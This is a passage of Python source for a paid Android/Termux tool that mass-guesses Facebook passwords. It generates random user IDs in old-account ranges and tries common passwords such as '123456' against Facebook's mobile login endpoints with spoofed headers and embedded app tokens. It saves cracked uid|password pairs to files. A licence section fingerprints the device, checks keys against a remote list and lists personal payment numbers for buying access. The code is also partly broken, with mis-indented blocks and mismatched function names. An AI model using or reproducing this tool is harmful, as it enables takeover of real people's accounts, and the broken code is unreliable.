    print(ROW("[1] 2009 - 2010",G))
    print(ROW("[2] 2011 - 2014",G))
    print(ROW("[3] CRACK ALL ACCOUNTS", G))
    print(ROW("[4] 100004 / 100004", G))
    print(ROW("[5] CRACK 2009-2013", G))
    print(ROW("[0] BACK TO MAIN MENU", R))

    print(BOTTOM())

    _input = choice = input(
        f"{R}➤{W} CHOICE {C}:{Y} {G}➤➤ {X}"
    )

    if _input in ('1', 'a', '01', '1'):

        menu_clear()

        ____old2009___()

    elif _input in ('2', 'b', '02', '2'):

        menu_clear()

        _____old2011_____()

    elif _input in ('3', 'c', '03', '3'):

        menu_clear()

        old_One()
        
   elif _input in ('4', '04', 'd', 'D'):
    
        menu_clear()
   
        old_Two()
        
   elif _input in ('5', '05', 'e', 'E'):
    
        menu_clear()
   
        old_Tree()

    else:

        print(f"\n{R}⚠ INVALID OPTION{X}")

        time.sleep(1)

        old_clone()

#---------------------------[ 2009-2010 CLONING ]---------------------------#
def ____old2009___():
    clear()
    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
    linex()
    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
    prefixes = ['100000']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('123456789', k=9))
        
        uid = prefix + suffix
        user.append(uid)
    with ShaniXD(max_workers=35) as Shani:
        clear()
        total_ids = int(limit)
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{total_ids}")
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
        linex()
        for uid in user:
            Shani.submit(____old____, uid,total_ids)

    print('');linex();print(f"\n{green} Cloning Session Complete")
    print(f"{white}➤ Total OK: {green}{len(oks)}")
    linex()
    exit()
   
#---------------------------[ 2011-2014 CLONING ]---------------------------#
def _____old2011_____():
    clear()
    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : 50000 | 100000 | 200000 | 300000")
    linex()
    limit = int(input(f'\033[1;97m Put Limit :\033[1;92m '))
    prefixes = ['10000']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('123456789', k=10))
        
        uid = prefix + suffix
        user.append(uid)
    with ShaniXD(max_workers=35) as Shani:
        clear()
        total_ids = int(limit)
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{total_ids}")
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m USE 1.1.1.1 VPN FOR BEST RESULT")
        linex()
        for uid in user:
            Shani.submit(____old____, uid,total_ids)

    print('');linex();print(f"\n{green} Cloning Session Complete")
    print(f"{white}➤ Total OK: {green}{len(oks)}")
    linex()
    exit()

def old_One():

    menu_clear()

    """
    Cloning method for accounts from 2010-2014.
    """

    user = []

    print(TOP("SELECT SERIES"))

    print(ROW("[1] 100000", G))
    print(ROW("[2] 100001", G))
    print(ROW("[3] 100002", G))
    print(ROW("[4] 100003", G))
    print(ROW("[5] 100004", G))

    print(MID())

    print(ROW("SELECT YOUR SERIES OPTION", Y))

    print(BOTTOM())

    ask = choice = input(
        f"{R}➤{W} CHOICE {C}:{Y} {G}➤➤ {X}"
    )

    # SELECT SERIES BLOCK CLEAR
    sys.stdout.write("\033[19;0H")
    sys.stdout.write("\033[J")
    sys.stdout.flush()

    print(TOP("LIMIT MENU"))

    print(ROW("EXAMPLE : 20000 • 30000 • 99999", G))

    print(BOTTOM())

    limit = choice = input(
        f"{R}➤{W} LIMIT {C}:{Y} {G}➤➤ {X}"
    )

    menu_clear()

    star = '10000'

    for _ in range(int(limit)):

        data = str(
            random.choice(
                range(
                    1000000000,
                    1999999999 if ask == '1' else 4999999999
                )
            )
        )

        user.append(data)

    print(TOP("SELECT METHOD"))

    print(ROW("[1] METHOD 1", G))
    print(ROW("[2] METHOD 2", G))

    print(BOTTOM())

    meth = choice = input(
        f"{R}➤{W} CHOICE {C}:{Y} {G}➤➤ {X}"
    )

    menu_clear()

    with tred(max_workers=10) as pool:

        print(TOP("PROCESS STARTED"))

        print(ROW(f"[★]➤ TOTAL IDS CRACK : {limit}", G))
        print(ROW(f"[★]➤ SELECTED        : M{meth}", G))
        print(ROW("[★]➤ USE VPN         : 1.1.1.1 / PROTON", Y))

        print(BOTTOM())

        for mal in user:

            uid = star + mal

            if meth == '1':

                pool.submit(login_1, uid)

            elif meth == '2':

                pool.submit(login_2, uid)

            else:

                print(f"{R}[!] INVALID METHOD SELECTED{X}")

                break


def old_Tow():

    menu_clear()

    """
    Cloning method for accounts with specific prefixes.
    """

    user = []

    print(TOP("SELECT SERIES"))

    print(ROW("[1] 100000", G))
    print(ROW("[2] 100001", G))
    print(ROW("[3] 100002", G))
    print(ROW("[4] 100003", G))
    print(ROW("[5] 100004", G))

    print(MID())

    print(ROW("SELECT YOUR SERIES OPTION", Y))

    print(BOTTOM())

    ask = choice = input(
        f"{R}➤{W} CHOICE {C}:{Y} {G}➤➤ {X}"
    )

    # SELECT SERIES BLOCK CLEAR
    sys.stdout.write("\033[19;0H")
    sys.stdout.write("\033[J")
    sys.stdout.flush()

    print(TOP("LIMIT MENU"))

    print(ROW("EXAMPLE : 20000 • 30000 • 99999", G))

    print(BOTTOM())

    limit = choice = input(
        f"{R}➤{W} LIMIT {C}:{Y} {G}➤➤ {X}"
    )

    menu_clear()

    prefixes = ['100004', '100004']

    for _ in range(int(limit)):

        prefix = random.choice(prefixes)

        suffix = ''.join(
            random.choices('0123456789', k=9)
        )

        uid = prefix + suffix

        user.append(uid)

    print(TOP("SELECT METHOD"))

    print(ROW("[1] METHOD 1", G))
    print(ROW("[2] METHOD 2", G))

    print(BOTTOM())

    meth = choice = input(
        f"{R}➤{W} CHOICE {C}:{Y} {G}➤➤ {X}"
    )

    menu_clear()

    with tred(max_workers=10) as pool:

        print(TOP("PROCESS STARTED"))

        print(ROW(f"[★]➤ TOTAL IDS CRACK : {limit}", G))
        print(ROW(f"[★]➤ SELECTED        : M{meth}", G))
        print(ROW("[★]➤ USE VPN         : 1.1.1.1 / PROTON", Y))

        print(BOTTOM())

        for uid in user:

            if meth == '1':

                pool.submit(login_1, uid)

            elif meth == '2':

                pool.submit(login_2, uid)

            else:

                print(f"{R}[!] INVALID METHOD SELECTED{X}")

                break


def old_Tree():

    menu_clear()

    """
    Cloning method for accounts from 2009-2013.
    """

    user = []

    print(TOP("2009-2013 CLONING"))

    print(ROW("OLD CODE : 2009-2013", G))

    print(BOTTOM())

    ask = input(
        f"{R}➤{W} SELECT {C}:{Y} {G}➤➤ {X}"
    )

    # SELECT SERIES BLOCK CLEAR
    sys.stdout.write("\033[19;0H")
    sys.stdout.write("\033[J")
    sys.stdout.flush()

    print(TOP("LIMIT MENU"))

    print(ROW("EXAMPLE : 20000 • 30000 • 99999", G))

    print(BOTTOM())

    limit = input(
        f"{R}➤{W} TOTAL ID COUNT {C}:{Y} {G}➤➤ {X}"
    )

    menu_clear()

    prefix = '1000004'

    for _ in range(int(limit)):

        suffix = ''.join(
            random.choices('0123456789', k=8)
        )

        uid = prefix + suffix

        user.append(uid)

    print(TOP("SELECT METHOD"))

    print(ROW("[1] METHOD 1", G))
    print(ROW("[2] METHOD 2", G))

    print(BOTTOM())

    meth = input(
        f"{R}➤{W} CHOICE (1/2) {C}:{Y} {G}➤➤ {X}"
    ).strip().upper()

    menu_clear()

    with tred(max_workers=10) as pool:

        print(TOP("PROCESS STARTED"))

        print(ROW(f"[★]➤ TOTAL IDS CRACK : {limit}", G))
        print(ROW(f"[★]➤ SELECTED        : M{meth}", G))
        print(ROW("[★]➤ USE VPN         : 1.1.1.1 / PROTON", Y))

        print(BOTTOM())

        for uid in user:

            if meth == '1':

                pool.submit(login_1, uid)

            elif meth == '2':

                pool.submit(login_2, uid)

            else:

                print(f"{R}[!] INVALID METHOD SELECTED{X}")

                break
   

def login_1(uid):
    """
    Login attempt method 1.
    """
    global loop
    session = requests.session()
    try:
        import sys
        sys.stdout.write(f"\r\r\x1b[38;5;46m[ASIM]\x1b[0m\x1b[38;5;196m({loop})\x1b[0m\x1b[38;5;46m(OK)\x1b[0m\x1b[38;5;46m({len(oks)})\x1b[0m")
        for pw in ('123456', '1234567', '12345678', '123456789', 'iloveyou', '000000'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\033[1;31m[\033[30mASIM\033[1;31m] \033[1;32m{uid} \033[1;37m|\033[1;91m {pw}\033[0m")
                open('/sdcard/ASIM-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\033[1;31m[\033[30mASIM\033[1;31m] \033[1;36m\033[1;32m{uid} \033[1;37m\033[30m{pw}\033[0m")
                open('/sdcard/ASIM-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    """
    Login attempt method 2.
    """
    sys.stdout.write(f"\r\r\x1b[38;5;46m[ASIM]\x1b[0m\x1b[38;5;196m({loop})\x1b[0m\x1b[38;5;46m(OK)\x1b[0m\x1b[38;5;46m({len(oks)})\x1b[0m")
    
    for pw in ('123456', '1234567', '12345678', '123456789', 'iloveyou', '000000'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quASIMty': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in po:
                    print(f"\r\033[1;31m[\033[30mASIM\033[1;31m] \033[1;32m{uid} \033[1;37m|\033[1;91m {pw}\033[0m")
                    open('/sdcard/ASIM-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\033[1;31m[\033[30mASIM\033[1;31m] \033[1;36m\033[1;32m{uid} \033[1;37m\033[30m{pw}\033[0m")
                    open('/sdcard/ASIM-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
                pass
import requests
import sys

import requests
import os
import time
import sys

# ANSI Color Codes
G = '\033[1;92m' # Green
W = '\033[1;37m' # White
R = '\033[1;91m' # Red
Y = '\033[1;93m' # Yellow
B = '\033[1;94m' # Blue
P = '\033[1;95m' # Purple
C = '\033[1;96m' # Cyan
import os, time, requests

# ─────────────────────────────
# 🎨 COLORS (ASIM STYLE)
# ─────────────────────────────
G = "\033[1;92m"
C = "\033[1;96m"
R = "\033[1;91m"
Y = "\033[1;93m"
P = "\033[1;95m"
W = "\033[0m"

# ─────────────────────────────
# 🔑 SHANI PREMIUM KEY SYSTEM
# ─────────────────────────────

import os
import hashlib
import requests
import subprocess
import base64
from datetime import datetime

# ================= API URL =================

APPROVED_URL = "https://raw.githubusercontent.com/FB-OLD/Shani-Cloning/main/keys.txt"

# ================= DEVICE INFO =================

def get_android_id():
    try:
        x = subprocess.check_output(
            "settings get secure android_id",
            shell=True
        ).decode().strip()

        if x and x != "null":
            return x

    except:
        pass

    return "ANDROID_ID"


def get_serial():
    try:
        x = subprocess.check_output(
            "getprop ro.serialno",
            shell=True
        ).decode().strip()

        if x and x != "unknown":
            return x

    except:
        pass

    return "SERIAL"


def get_brand():
    try:
        return subprocess.check_output(
            "getprop ro.product.brand",
            shell=True
        ).decode().strip()
    except:
        return "BRAND"


def get_model():
    try:
        return subprocess.check_output(
            "getprop ro.product.model",
            shell=True
        ).decode().strip()
    except:
        return "MODEL"


def get_device():

    try:
        return subprocess.check_output(
            "getprop ro.product.device",
            shell=True
        ).decode().strip()

    except:
        return "DEVICE"
def get_app_uuid():

    path = os.path.expanduser("~/.shani_uuid")

    try:

        if os.path.exists(path):

            return open(path).read().strip()

        new_uuid = str(uuid.uuid4()).replace("-", "")[:16]

        with open(path, "w") as f:

            f.write(new_uuid)

        return new_uuid

    except:

        return "SHANI-UUID"

# ================= PERMANENT UNIQUE KEY =================

def get_device_key():

    unique_uuid = get_app_uuid()

    data = (
        get_android_id() +
        get_serial() +
        get_brand() +
        get_model() +
        get_device() +
        unique_uuid
    )

    key = hashlib.sha256(
        data.encode()
    ).hexdigest().upper()

    # MIXED FINAL 8 CHAR KEY
    final = (
        key[:4] +
        key[-4:]
    )

    return final

# ================= LIVE CHECK KEY =================

def check_key(key):

    try:

        headers = {

            "Cache-Control": "no-cache",
            "Pragma": "no-cache"

        }

        response = requests.get(
            APPROVED_URL,
            headers=headers,
            timeout=10
        )

        data = response.json()

        content = base64.b64decode(
            data["content"]
        ).decode()

        lines = content.splitlines()
        print("DEBUG: TOTAL LINES =", len(lines))
        print("DEBUG: INPUT KEY =", key)

        now = datetime.now()

        for line in lines:
        print("DEBUG RAW LINE:", line)

          line = line.strip()

          if "|" not in line:
              continue

          saved_key, exp_date = line.split("|", 1)
          print("DEBUG SAVED KEY:", saved_key.strip())
          print("DEBUG EXP DATE:", exp_date.strip())

          saved_key = saved_key.strip()
          exp_date = exp_date.strip()

            # MATCH KEY
            if saved_key.strip() == key.strip():

                try:

                    exp = datetime.strptime(
                        exp_date,
                        "%d-%m-%Y %I:%M %p"
                    )

                except:

                    return "not", None, None

                # APPROVED
                if now <= exp:

                    remaining = exp - now

                    days = remaining.days

                    hours = (
                        remaining.seconds // 3600
                    )

                    minutes = (
                        remaining.seconds % 3600
                    ) // 60

                    left = (
                        f"{days}D "
                        f"{hours}H "
                        f"{minutes}M"
                    )

                    return (
                        "approved",
                        exp_date,
                        left
                    )

                # EXPIRED
                else:

                    return (
                        "expired",
                        exp_date,
                        "0D 0H 0M"
                    )

        return "not", None, None

    except:

        return "not", None, None

# ================= ACCESS DENIED =================

def access_denied_block(key, status, exp=None):

    R = '\033[1;91m'
    G = '\033[1;92m'
    Y = '\033[1;93m'
    C = '\033[1;96m'
    W = '\033[1;97m'
    P = '\033[1;95m'
    X = '\033[0m'

    print()

    # ERROR BOX

    print(R + "┌──────────────── ACCESS DENIED ────────────────┐" + X)

    if status == "expired":

        print(R + "│" + W + " YOUR KEY IS EXPIRED ".center(48) + R + "│")

    else:

        print(R + "│" + W + " YOUR KEY IS NOT APPROVED ".center(47) + R + "│")

    print(R + "└───────────────────────────────────────────────┘" + X)

    # KEY BOX

    print(C + "┌───────────────── YOUR KEY ────────────────────┐" + X)

    print(C + "│" + W + " COPY THIS KEY AND SEND TO ADMIN ".center(47) + C + "│")

    print(C + "├───────────────────────────────────────────────┤" + X)

    print(C + "│ " + Y + f"{key}".center(46) + C + "│")

    print(C + "└───────────────────────────────────────────────┘" + X)

    print()

    # STATUS

    if status == "expired":

        print(R + "➤ STATUS : EXPIRED" + X)

        if exp:

            print(Y + f"➤ EXPIRY : {exp}" + X)

    else:

        print(R + "➤ STATUS : NOT APPROVED" + X)

    print()

    # PAYMENT BOX

    print(G + "┌────────────── PAYMENT METHODS ────────────────┐" + X)

    print(G + "│ " + W + "ACCOUNT NAME : " + Y + "MUHAMMAD SAFDAR".ljust(31) + G + "│")

    print(G + "├───────────────────────────────────────────────┤" + X)

    print(G + "│ " + W + "EASYPAISA : " + C + "03060725589".ljust(34) + G + "│")

    print(G + "│ " + W + "JAZZCASH  : " + C + "03060725589".ljust(34) + G + "│")

    print(G + "│ " + W + "SADAPAY   : " + C + "03060725589".ljust(34) + G + "│")

    print(G + "├───────────────────────────────────────────────┤" + X)

    print(G + "│ " + W + "3 DAYS   : " + Y + "150 PKR".ljust(35) + G + "│")

    print(G + "│ " + W + "7 DAYS   : " + Y + "300 PKR".ljust(35) + G + "│")

    print(G + "│ " + W + "30 DAYS  : " + Y + "500 PKR".ljust(35) + G + "│")

    print(G + "└───────────────────────────────────────────────┘" + X)

    print()

    # CONTACT

    input(P + "[>] PRESS ENTER TO CONTACT ADMIN " + X)

    msg = (
        f"Assalam O Alaikum Shani Bhai,%0A%0A"
        f"My Device Key Is : {key}%0A%0A"
        f"Please Approve My Key."
    )

    os.system(
        f'am start -a android.intent.action.VIEW '
        f'-d "https://wa.me/923200795589?text={msg}"'
    )

# ─────────────────────────────
# 🚀 START
# ─────────────────────────────

try:

    boot_screen()

    while True:

        key = get_device_key()

        user_key = key

        status, exp, left = check_key(key)

        globals()['status'] = status
        globals()['exp'] = exp
        globals()['left'] = left

        BNG_71_()

        break

except requests.exceptions.ConnectionError:

    print("\033[1;91m✖ NO INTERNET CONNECTION\033[0m")

except Exception as e:

    print("\033[1;91mERROR:\033[0m", e)
